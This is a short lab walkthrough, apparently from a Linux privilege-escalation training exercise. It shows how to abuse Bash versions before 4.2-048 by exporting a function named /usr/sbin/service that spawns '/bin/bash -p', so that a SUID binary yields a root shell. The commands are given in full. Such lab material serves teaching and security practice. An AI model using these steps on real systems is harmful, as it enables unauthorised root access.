# Abusing Shell Features (#1)

The /usr/local/bin/suid-env2 executable is identical to /usr/local/bin/suid-env except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.

Verify this with strings:

`strings /usr/local/bin/suid-env2`\


In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.

Verify the version of Bash installed on the Debian VM is less than 4.2-048:

`/bin/bash --version`

Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:

`function /usr/sbin/service { /bin/bash -p; }`\
`export -f /usr/sbin/service`

Run the suid-env2 executable to gain a root shell:

`/usr/local/bin/suid-env2`
